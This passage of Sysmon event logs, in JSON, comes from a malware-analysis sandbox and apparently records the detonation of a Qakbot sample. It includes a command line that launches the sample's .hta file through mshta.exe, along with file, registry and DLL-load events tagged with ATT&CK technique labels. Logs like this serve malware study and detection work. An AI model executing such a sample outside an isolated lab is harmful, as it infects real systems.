C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\r\nHashes: SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,MD5=D41D8CD98F00B204E9800998ECF8427E,SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855,IMPHASH=00000000000000000000000000000000\r\nIsExecutable: false\r\nArchived: true","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003eScripts and payloads\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:14.629\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-cd30-6400-ca00-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9336\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\Mozilla Firefox\\firefox.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,MD5=D41D8CD98F00B204E9800998ECF8427E,SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855,IMPHASH=00000000000000000000000000000000\u003c/Data\u003e\u003cData Name=\"IsExecutable\"\u003efalse\u003c/Data\u003e\u003cData Name=\"Archived\"\u003etrue\u003c/Data\u003e\u003c/EventData\u003e","Task":23,"RuleName":"Scripts and payloads","UtcTime":"2023-03-02 16:38:14.629","ProcessGuid":"159466bb-cd30-6400-ca00-000000000f00","ProcessId":9336,"User":"FLAREVM\\malware","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","TargetFilename":"C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js","Hashes":"SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,MD5=D41D8CD98F00B204E9800998ECF8427E,SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855,IMPHASH=00000000000000000000000000000000","IsExecutable":false,"Archived":"true"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:14.632Z","TimeGenerated":"2023-03-02T04:38:14.632Z","EventRecordID":"57635","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1059.007,technique_name=JavaScript\r\nUtcTime: 2023-03-02 16:38:14.629\r\nProcessGuid: {159466bb-cd30-6400-ca00-000000000f00}\r\nProcessId: 9336\r\nImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nTargetFilename: C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\r\nCreationUtcTime: 2023-03-02 16:38:14.629\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059.007,technique_name=JavaScript\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:14.629\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-cd30-6400-ca00-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9336\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\Mozilla Firefox\\firefox.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:14.629\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1059.007,technique_name=JavaScript","UtcTime":"2023-03-02 16:38:14.629","ProcessGuid":"159466bb-cd30-6400-ca00-000000000f00","ProcessId":9336,"Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","TargetFilename":"C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js","CreationUtcTime":"2023-03-02 16:38:14.629","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:14.785Z","TimeGenerated":"2023-03-02T04:38:14.785Z","EventRecordID":"57636","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:14.784\r\nProcessGuid: {159466bb-a9f3-63f7-1e00-000000000f00}\r\nProcessId: 1488\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat\r\nCreationUtcTime: 2023-03-02 16:22:41.872\r\nUser: NT AUTHORITY\\LOCAL SERVICE","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:14.784\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-1e00-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1488\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\System32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:22:41.872\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\LOCAL SERVICE\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:14.784","ProcessGuid":"159466bb-a9f3-63f7-1e00-000000000f00","ProcessId":1488,"Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat","CreationUtcTime":"2023-03-02 16:22:41.872","User":"NT AUTHORITY\\LOCAL SERVICE"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:16.398Z","TimeGenerated":"2023-03-02T04:38:16.398Z","EventRecordID":"57637","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:16.396\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\MSHTA.EXE-392EB492.pf\r\nCreationUtcTime: 2023-03-02 16:38:16.396\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:16.396\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\MSHTA.EXE-392EB492.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:16.396\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:16.396","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\MSHTA.EXE-392EB492.pf","CreationUtcTime":"2023-03-02 16:38:16.396","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.110Z","TimeGenerated":"2023-03-02T04:38:21.110Z","EventRecordID":"57638","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:21.096\r\nProcessGuid: {159466bb-cd21-6400-9700-000000000f00}\r\nProcessId: 6508\r\nImage: C:\\Windows\\Explorer.EXE\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.096\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-cd21-6400-9700-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e6508\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\Explorer.EXE\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:21.096","ProcessGuid":"159466bb-cd21-6400-9700-000000000f00","ProcessId":6508,"Image":"C:\\Windows\\Explorer.EXE","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.111Z","TimeGenerated":"2023-03-02T04:38:21.111Z","EventRecordID":"57639","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2023-03-02 16:38:21.110\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nFileVersion: 11.00.19041.1 (WinBuild.160101.0800)\r\nDescription: Microsoft (R) HTML Application host\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: MSHTA.EXE\r\nCommandLine: \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F\r\nParentProcessGuid: {159466bb-cd21-6400-9700-000000000f00}\r\nParentProcessId: 6508\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1204,technique_name=User Execution\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.110\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e11.00.19041.1 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft (R) HTML Application host\u003c/Data\u003e\u003cData Name=\"Product\"\u003eInternet Explorer\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eMSHTA.EXE\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-cd21-6400-9700-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e6508\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\explorer.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003eC:\\Windows\\Explorer.EXE\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1204,technique_name=User Execution","UtcTime":"2023-03-02 16:38:21.110","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","FileVersion":"11.00.19041.1 (WinBuild.160101.0800)","Description":"Microsoft (R) HTML Application host","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"MSHTA.EXE","CommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F","ParentProcessGuid":"159466bb-cd21-6400-9700-000000000f00","ParentProcessId":6508,"ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.132Z","TimeGenerated":"2023-03-02T04:38:21.132Z","EventRecordID":"57640","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:21.130\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\urlmon.dll\r\nFileVersion: 11.00.19041.2251 (WinBuild.160101.0800)\r\nDescription: OLE32 Extensions for Win32\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: UrlMon.dll\r\nHashes: SHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.130\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\urlmon.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e11.00.19041.2251 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eOLE32 Extensions for Win32\u003c/Data\u003e\u003cData Name=\"Product\"\u003eInternet Explorer\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eUrlMon.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:21.130","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\urlmon.dll","FileVersion":"11.00.19041.2251 (WinBuild.160101.0800)","Description":"OLE32 Extensions for Win32","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"UrlMon.dll","Hashes":"SHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.205Z","TimeGenerated":"2023-03-02T04:38:21.205Z","EventRecordID":"57641","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:21.192\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\vbscript.dll\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® VBScript\r\nProduct: Microsoft ® VBScript\r\nCompany: Microsoft Corporation\r\nOriginalFileName: vbscript.dll\r\nHashes: SHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.192\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\vbscript.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft ® VBScript\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® VBScript\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003evbscript.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:21.192","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\vbscript.dll","FileVersion":"5.812.10240.16384","Description":"Microsoft ® VBScript","Product":"Microsoft ® VBScript","Company":"Microsoft Corporation","OriginalFileName":"vbscript.dll","Hashes":"SHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},